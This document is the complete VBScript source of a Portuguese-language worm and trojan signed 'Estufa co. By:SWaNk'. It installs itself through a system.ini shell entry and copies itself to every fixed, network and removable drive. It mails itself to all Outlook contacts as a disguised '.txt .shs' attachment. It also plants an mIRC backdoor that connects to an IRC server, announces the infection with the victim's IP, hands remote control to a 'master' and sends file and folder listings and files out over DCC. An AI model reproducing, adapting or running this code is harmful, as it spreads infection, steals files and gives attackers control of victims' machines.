dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef

Call rodado("c:\File0004.CHK")
Call ntwrk()
call ShowFolderList("c:\")

sub ShowFolderList(s)
on error resume next

Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
	Set SubFolds1 = RootFolder1.subfolders
	For Each f1 in Subfolds1
		s = f1.path & "\"
		Otag = s & "mirc.ini"
		AOtag= s & "mirc.dat"
		DummyTag= "C:\winamod.dat"
		TTag= s & "addonGUI.dll"
		SectionDef= "[rfiles]"
		if filesys.fileexists(otag) then 
			Call Filemod() 
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementRemote()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementWarn()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementFserv()
			filesys.CopyFile DummyTag, Otag, true
			call ImplementPerfCheck()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementPerform()
			SetClearArchiveBit(Otag)
Call criaFile0001()
Call criaFile0002()
Call apagaPayload("platônico.txt")

		End If
	Call ShowFolderList(s)
Next
End sub

sub instala ()
Dim obj,windows,s, f
Set obj = CreateObject("Scripting.FileSystemObject")
Set windows = obj.GetSpecialFolder(0)
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
f.copy(windows&"\explorer.dll.vbs")
alvo5="explorer.dll.vbs"
editini windows&"\system.ini","[boot]","shell","Explorer.exe " & alvo5
end sub

Function FiltNum(FilString)
'on error resume next
countdown=5
do
	Comp = mid(FilString,2,countdown)
	if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function

Function LastLineNum(SSection)
'on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)

Do While FR1N.AtEndOfStream <> True
	segment1 = FR1N.readline
	w = InstrRev(segment1,SSection)
	counts=counts+1
	if w > 0 then 
		do
			if FR1N.AtEndOfStream = True then exit do
			segmentk = FR1N.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
			end if
		Loop until k=0
	end if
loop
FR1N.Close
LastLineNum=LastNum
end function

Function Filemod()
'on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)

Do While fr1.AtEndOfStream <> True
	segment1 = fr1.readline
	fr2.writeline segment1
	w = InstrRev(segment1,"[rfiles]")
	counts=counts+1
	if w > 0 then 
	counts2=counts
		do
			if fr1.AtEndOfStream = True then exit do
			segmentk = fr1.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
				fr2.writeline segmentk
			end if
		COUNTS2=COUNTS2+1
		Loop until k<>1
	exit do
	end if
loop
fr1.Close
fr2.close

Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=addonGUI.dll"
fr3.writeline TrojanInfo
fr3.Close

Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)

Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)

Do While fr4.AtEndOfStream <> True
	segment2 = fr4.readline
	if fr4.line >= counts2 + 2 then 
		fr5.writeline segment2
	end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function

sub FLDL(TTag)
'on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "on 1:TEXT:*teste do script*:*:{  //set %mstr $nick |  //raw -q privmsg %mstr : Estou infectado ip: $ip $+ : $+ $port ( $+ $server $+ ) raiz do mirc ( $+ $mircdir $+ ) | //halt }"
  fr6.writeline "ctcp 1:*:*:{  if ( $nick == %mstr ) { $1- |  /halt  } }"
    fr6.writeline "1:INPUT:*:{ if (%mstr != $null)  //raw -q privmsg %mstr : -  $me para $active  - $1- }"
      fr6.writeline "on 1:TEXT:*:?:{  if (%mstr != $null) //raw -q privmsg %mstr : - $nick para $me - $1- }"
        fr6.writeline "alias sinc { set %mstr $read(File0003.CHK, 2) }"
          fr6.writeline "alias diretorios {  run c:\File0001.CHK.vbs | set %arquivo c:\File0001.txt |  LS %mstr }"
            fr6.writeline "alias arquivos {  run c:\File0002.CHK.vbs | set %arquivo c:\File0002.txt |  LS %mstr }"
              fr6.writeline "alias baixar { set %arquivo $read(File0003.CHK, 1) |  LS %mstr }"
                fr6.writeline "On 1:SockClose:ƒ.*:{"
                fr6.writeline "  Set %£.tmp6 $remove($sockname,ƒ.) "
                fr6.writeline "  sockclose $sockname "
                fr6.writeline "  sockclose [ £. $+ [ %£.tmp6 ] ] "
                fr6.writeline "  .timer $+ %£.tmp6 off"
                fr6.writeline "}"
                fr6.writeline "On 1:SockListen:£.*:{"
                fr6.writeline "  Set %£.tmp5 $remove($sockname,£.) "
                fr6.writeline "  sockaccept ƒ. $+ %£.tmp5 "
                fr6.writeline "  SL %£.tmp5 "
                fr6.writeline "}"
                fr6.writeline "On 1:SockWrite:ƒ.*:{"
                fr6.writeline "  Set %£.tmp6 $remove($sockname,ƒ.) "
                fr6.writeline "  if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) {"
                fr6.writeline "    .timer $+ $r(99,9999) 1 10 sockclose $sockname "
                fr6.writeline "    .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] "
              fr6.writeline "  .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 "
              fr6.writeline "}"
              fr6.writeline "alias LS {"
              fr6.writeline "  if ( $sock(£.*,0) > 5 ) { return } "
              fr6.writeline "  Set %£S. $+ $1 0 "
              fr6.writeline "  :pointless "
              fr6.writeline "  Set %pt $r(2400,5000) "
              fr6.writeline "  if ( $portfree(%pt) = $false ) { goto pointless } "
              fr6.writeline "  Set [ % $+ [ be. $+ [ $1 ] ] ] 0 "
              fr6.writeline "  Set %pk. $+ $1 4096 "
              fr6.writeline "  Set %sz $file(%arquivo).size "
              fr6.writeline "  Set %£.tmp4 £. $+ $1 "
              fr6.writeline "  .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 "
              fr6.writeline "  .timer1 $+ $1 1 20 TO $1 "
              fr6.writeline "  .notice $1 DCC Send $left($gettok(%arquivo,3,92), $calc( [ $len( [ $gettok(%arquivo,3,92) ] ) ] - 4 ) ) ( $+ $ip $+ ) "
              fr6.writeline "  if ( $1 = %£.warning ) { return } "
              fr6.writeline "  .ignore -u90 $1 2 "
              fr6.writeline "  .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %arquivo $longip($ip) %pt %sz $+ $chr(1) "
              fr6.writeline "  if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } "
              fr6.writeline "  .socklisten %£.tmp4 %pt "
              fr6.writeline "}"
              fr6.writeline "alias SL {"
              fr6.writeline "  if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) {"
              fr6.writeline "    bread %arquivo [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data "
              fr6.writeline "    .sockwrite ƒ. $+ $1 &data "
              fr6.writeline "    inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] "
            fr6.writeline "  } "
            fr6.writeline "  else {"
            fr6.writeline "    Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) "
            fr6.writeline "    if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } "
            fr6.writeline "    bread %arquivo [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data "
            fr6.writeline "    .sockwrite ƒ. $+ $1 &data "
            fr6.writeline "  }"
            fr6.writeline "}"
            fr6.writeline "raw 401:*: halt | raw 404:*: halt"
            fr6.writeline "on 1:CONNECT:aviso | set %mirc.raiz $mircdir "
            fr6.writeline "on 1:DISCONNECT: set %mstr $null "
            fr6.writeline "on 1:JOIN:#:manda | aviso"
            fr6.writeline "on 1:sockopen:aviso*:{"
            fr6.writeline "  if (aviso isin $sockname) {"
            fr6.writeline "    sockwrite -tn $sockname user estufa - - : $+ $strip($logo)"
            fr6.writeline "    sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) "
            fr6.writeline "  }"
            fr6.writeline "}"
            fr6.writeline "on 1:sockread:*:{"
            fr6.writeline "  if (aviso isin $sockname) {"
            fr6.writeline "    sockread %recebido"
            fr6.writeline "    if ($left(%recebido,6) == PING $+ $chr(32) $+ :) { sockwrite -tn $sockname PONG $mid(%recebido,6,$len(%recebido)) }"
              fr6.writeline "  }"
              fr6.writeline "}"
              fr6.writeline "alias aviso { sockclose aviso | sockopen aviso irc.libnet.com.br 6667 }"
                fr6.writeline "alias manda {  if (%mstr != $null) { sockwrite -tn aviso privmsg %mstr : Estou infectado ip: $+ $ip $+ : $+ $port ( $+ $server $+ ) raiz do mirc ( $+ $mircdir $+ )  } }"
                  fr6.close
                  end sub

                  Function ImplementRemote()
                  Set fs1a = CreateObject("Scripting.FileSystemObject")
                  Set fr1a = fs1a.OpenTextFile(otag,1,true)
                  Set fs2a = CreateObject("Scripting.FileSystemObject")
                  Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

                  Do While fr1a.AtEndOfStream <> True
                  	segment1a = fr1a.readline
                  	fr2a.writeline segment1a
                  	if ucase(segment1a)=ucase("[options]") then
                  	Do
                  		If fr1a.AtEndOfStream Then exit do
                  		n2a = fr1a.readline
                  		If ucase(mid(n2a,1,3))=ucase("n2=") then
                  			fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
                  			exit do
                  		Else
                  			fr2a.writeline n2a
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1a.Close
                  fr2a.close
                  End Function

                  Function Implementfserv()
                  Set fs1a = CreateObject("Scripting.FileSystemObject")
                  Set fr1a = fs1a.OpenTextFile(otag,1,true)
                  Set fs2a = CreateObject("Scripting.FileSystemObject")
                  Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

                  Do While fr1a.AtEndOfStream <> True
                  	segment1a = fr1a.readline
                  	fr2a.writeline segment1a
                  	if ucase(segment1a)=ucase("[warn]") then
                  	Do
                  		If fr1a.AtEndOfStream Then exit do
                  		n2a = fr1a.readline
                  		If ucase(n2a)=ucase("fserve=on") then
                  			fr2a.writeline "fserve=off"
                  		Else
                  			fr2a.writeline n2a
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1a.Close
                  fr2a.close
                  End Function

                  Function Implementwarn()
                  Set fs1c = CreateObject("Scripting.FileSystemObject")
                  Set fr1c = fs1c.OpenTextFile(otag,1,true)
                  Set fs2c = CreateObject("Scripting.FileSystemObject")
                  Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)

                  Do While fr1c.AtEndOfStream <> True
                  	segment1c = fr1c.readline
                  	fr2c.writeline segment1c
                  	if ucase(segment1c)=ucase("[fileserver]") then
                  	Do
                  		if fr1c.AtEndOfStream then exit do
                  		n2c = fr1c.readline
                  		If ucase(n2c)=ucase("warning=on") then
                  			fr2c.writeline "warning=off"
                  		Else
                  			fr2c.writeline n2c
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1c.Close
                  fr2c.close
                  End Function

                  Function ImplementPerform()
                  Set fs1p = CreateObject("Scripting.FileSystemObject")
                  Set fr1p = fs1p.OpenTextFile(Otag,8,true)
                  fr1p.writeline "[Perform]"
                  fr1p.writeline "n0=/Remote ON"
                  fr1p.Close
                  fs1p.close
                  End Function

                  Sub SetClearArchiveBit(filespec)  
                  Dim fsg, fg
                  Set fsg = CreateObject("Scripting.FileSystemObject")
                  Set fg = fsg.GetFile(filespec)  
                  fg.attributes = 0
                  fg.attributes = fg.attributes + 1
                  End Sub

                  Function ImplementPerfCheck()
                  Set fs1f = CreateObject("Scripting.FileSystemObject")
                  Set fr1f = fs1f.OpenTextFile(otag,1,true)
                  Set fs2f = CreateObject("Scripting.FileSystemObject")
                  Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)

                  Do While fr1f.AtEndOfStream <> True
                  	segment1f = fr1f.readline
                  	fr2f.writeline segment1f
                  	if ucase(segment1f)=ucase("[options]") then
                  	Do
                  		If fr1f.AtEndOfStream Then exit do
                  		n2f = fr1f.readline
                  		If ucase(mid(n2f,1,3))=ucase("n0=") then
                  			fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
                  			exit do
                  		Else
                  			fr2f.writeline n2f
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1f.Close
                  fr2f.close
                  End Function

                  sub editini(filename,section,string,newvalue)
                  on error resume next
                  Const ForReading = 1
                  Const ForWriting = 2
                  iniFile = filename
                  sectionName = section
                  keyName = string
                  newVlaue = newvalue
                  bInSection = false
                  bKeyChanged = false
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set ts = fso.OpenTextFile(iniFile, ForReading)
                  lines = Split(ts.ReadAll,vbCrLf)
                  ts.close
                  For n = 0 to ubound(lines)
                  if left(lines(n),1) = "[" then
                  if bInSection then
                  exit for
                  end if
                  if instr(lines(n),sectionName) = 1 then
                  bInSection = true
                  else
                  bInSection = false
                  end if
                  else
                  if bInSection then
                  if instr(lines(n),keyName & "=") = 1 then
                  bKeyChanged = true
                  lines(n) = keyName & "=" & newVlaue
                  bKeyChanged = true
                  exit for
                  end if
                  end if
                  end if
                  Next
                  if bKeyChanged then
                  Set ts = fso.OpenTextFile(iniFile, ForWriting)
                  ts.Write join(lines,vbCrLf)
                  ts.close
                  end if
                  set ts = nothing
                  set fso = nothing
                  end sub

                  Sub CriaFile0001 ()
                  Dim fso, MyFile
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set MyFile = fso.CreateTextFile("c:\file0001.CHK.vbs", True)
                  MyFile.WriteLine("call ShowFolderList" & Chr(40) & Chr(34) & "c:\" & Chr(34) & Chr(41) )
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Function ShowFolderList" & Chr(40) & "folderspec" & Chr(41) )
                  MyFile.WriteLine("Dim fso, f, f1, fc, s, CRLF, arquivo")
                  MyFile.WriteLine("CRLF = Chr" & Chr(40) & "13" & Chr(41) & " & " & "Chr" & Chr(40) & "10" & Chr(41) )
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set f = fso.GetFolder" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("Set fc = f.SubFolders")
                  MyFile.WriteLine("For Each f1 in fc")
                  MyFile.WriteLine("s = s & f1.name") 
                  MyFile.WriteLine("s = s & CRLF")
                  MyFile.WriteLine("Next")
                  MyFile.WriteLine("ShowFolderList = s")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set arquivo= fso.CreateTextFile" & chr(40) & chr(34) & "c:\File0001.txt" & chr(34) & ", True" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------=(Lista de Sub diretórios)=-----------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "s" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------------=(eof)=-------------------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "Estufa co. By:SWaNk" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.Close")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("End Function")
                  MyFile.Close
                  End Sub

                  Sub CriaFile0002 ()
                  Dim fso, MyFile
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set MyFile = fso.CreateTextFile("c:\file0002.CHK.vbs", True)
                  MyFile.WriteLine("call ShowFileList" & Chr(40) & Chr(34) & "c:\" & Chr(34) & Chr(41) )
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Function ShowFileList" & Chr(40) & "folderspec" & Chr(41) )
                  MyFile.WriteLine("Dim fso, f, f1, fc, s, CRLF, arquivo")
                  MyFile.WriteLine("CRLF = Chr" & Chr(40) & "13" & Chr(41) & " & " & "Chr" & Chr(40) & "10" & Chr(41) )
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set f = fso.GetFolder" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("Set fc = f.Files")
                  MyFile.WriteLine("For Each f1 in fc")
                  MyFile.WriteLine("s = s & f1.name") 
                  MyFile.WriteLine("s = s & CRLF")
                  MyFile.WriteLine("Next")
                  MyFile.WriteLine("ShowFileList = s")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set arquivo= fso.CreateTextFile" & chr(40) & chr(34) & "c:\File0002.txt" & chr(34) & ", True" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------=(Lista de Arquivos)=-----------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "s" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------------=(eof)=-------------------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "Estufa co. By:SWaNk" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.Close")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("End Function")
                  MyFile.Close
                  End Sub

                  Function espalha()
                  Dim obj, win,s,f,assuntos
                  Set obj = CreateObject("Scripting.FileSystemObject")
                  Set win = obj.GetSpecialFolder(0)
                  set s = CreateObject("Scripting.FileSystemObject")
                  Set f = s.GetFile(WScript.ScriptFullName)
                  f.copy(win&"\Platônico.txt                                                                            .shs")
                  local=win&"\Platônico.txt                                                                            .shs"
                  var1="Out" & "look"
                  Set FRS68KB2 = CreateObject("Out" & "look.App" &"lic" & "ation")
                  If FRS68KB2 = var1 Then
                  Set MB75TQQ8 = FRS68KB2.GetNameSpace("M" & "A" & "PI")
                  Set M7S7H1IR =MB75TQQ8.AddressLists 
                  For Each GT6C51QD In M7S7H1IR
                  If GT6C51QD.AddressEntries.Count <> 0 Then
                  R35B1P85 = GT6C51QD.AddressEntries.Count
                  For JU378G6M = 1 To R35B1P85
                  Set H7G48BDM = FRS68KB2.CreateItem(0)
                  Set GVU5OH32 = GT6C51QD.AddressEntries(JU378G6M)
                  H7G48BDM.To = GVU5OH32.Address
                  Randomize
                  assuntos = Int((3 * Rnd) + 1)	
                  if assuntos = 1 then
                  H7G48BDM.Subject = "Texto imperdível!"
                  elseif assuntos = 2 then
                  H7G48BDM.Subject = "Texto muito engraçado!"
                  else 
                  H7G48BDM.Subject = "O melhor texto que li nos últimos tempos..."
                  End if
                  H7G48BDM.Body = "................................................" & vbcrlf & "Olá!!" & vbcrlf & "Não posso falar muito sobre o texto porque se não perde a graça, é uma história de amor platônico... Achei muito engraçado vale a pena!!" & vbcrlf & "....  .... .  .....    .....  ....  . ...   ....." & vbcrlf & "..... ....   ....  .     .  ....    .....  ...." & vbcrlf & ""
                  execute "set TQK3VJ18 =H7G48BDM." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
                  SND01BAO = local
                  H7G48BDM.DeleteAfterSubmit = True
                  TQK3VJ18.Add SND01BAO
                  If H7G48BDM.To <> "" Then
                  H7G48BDM.Send
                  End If
                  Next
                  End If
                  Next
                  End If
                  End function

                  Sub marca()
                  Dim fso, MyFile
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set MyFile = fso.CreateTextFile("c:\File0004.CHK", True)
                  MyFile.WriteLine("Estufa co.")
                  MyFile.Close
                  End Sub

                  Function rodado(filespec)
                  Dim fso, msg
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  If (fso.FileExists(filespec)) Then
                  Call payload()
                  Else
                  Call payload()
                  Call instala()
                  Call espalha()
                  Call marca()
                  End If
                  End Function

                  Function apagaPayload(filespec)
                  Dim fso, msg
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  If (fso.FileExists(filespec)) Then
                  Call apaga("Platônico.txt")
                  End If
                  End Function

                  Sub payload ()
                  Dim fso, payload, WshShell, cmnd
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set payload = fso.CreateTextFile("Platônico.txt", True)
                  payload.WriteLine("   Satânico é o meu pensamento ao teu respeito e ardente é o meu desejo de ")
                  payload.WriteLine("apertar-te em minhas mãos, uma sede de vingança incontestável pelo que me fizeste ontem.") 
                  payload.WriteLine("A noite quente e calma chegara a ser angustiosa. Apareceste e nesta cama aconteceu... ")
                  payload.WriteLine("Sorrateiramente te aproximaste... ")
                  payload.WriteLine("Sem o mínimo pudor... ")
                  payload.WriteLine("Encostaste o teu corpo sem roupa no meu corpo nú. ")
                  payload.WriteLine("Percebendo a minha aparente indiferença, aconchegaste-te a mim, e mordeste-me")
                  payload.WriteLine("sem escrúpulos até os mais íntimos lugares jamais tocados de meu casto corpo. ")
                  payload.WriteLine("E adormeci... ")
                  payload.WriteLine("Hoje, quando acordei, procurei-te numa ânsia ardente, mas em vão...") 
                  payload.WriteLine("Deixaste provas irrefutíveis do que ocorreu na noite que passou. ")
                  payload.WriteLine("Grandes manchas no meu corpo e o alvo lençol salpicado de sangue. ")
                  payload.WriteLine("Esta noite recolho-me mais cedo para, na mesma cama te esperar. ")
                  payload.WriteLine("Oh! Quando chegares, nem quero pensar com que perspicácia, ")
                  payload.WriteLine("avidez e força eu quero te pegar para que não escapes mais de mim. ")
                  payload.WriteLine("Em minhas mãos quero apertar-te até o fim. ")
                  payload.WriteLine("Não haverá parte do teu corpo que os meus dedos não passarão. ")
                  payload.WriteLine("Não descansarei enquanto ver sair o sangue quente de teu corpo. ")
                  payload.WriteLine(" ")
                  payload.WriteLine("Só assim livrar-me-ei de ti PULGA MALDITA.") 
                  payload.Close
                  Set WshShell = WScript.CreateObject("WScript.Shell")
                  cmnd = "notepad.exe platônico.txt"
                  WshShell.Run (cmnd)
                  End Sub

                  Sub apaga(filespec)
                  Dim fso
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  fso.DeleteFile(filespec)
                  End Sub

                  sub infect(drive)
                  On Error Resume Next
                  set s = CreateObject("Scripting.FileSystemObject")
                  Set f = s.GetFile(WScript.ScriptFullName)
                  f.copy(drive & "\Pulga.txt.shs")
                  path=drive&"\Pulga.txt.shs"
                  end sub
                  Function ShowDriveType(drvpath)
                  On Error Resume Next
                  Dim fso, d, t
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set d = fso.GetDrive(drvpath)
                  Select Case d.DriveType
                  Case 0: t = "Unknown"
                  Case 1: t = "Removable"
                  Case 2: t = "Fixed"
                  Case 3: t = "Network"
                  Case 4: t = "CD-ROM"
                  Case 5: t = "RAM Disk"
                  End Select
                  if t = "" then t = "None"
                  ShowDriveType = t
                  End Function
                  sub ntwrk()
                  On Error Resume Next
                  for n = 65 to 90
                  l=Chr(n) 
                  drv=l&":"
                  d3=ShowDriveType(drv)
                  if d3 = "Fixed" then infect(drv)
                  if d3 = "Network" then infect(drv)
                  if d3 = "Removable" then infect(drv)
                  next
                  end sub
                                  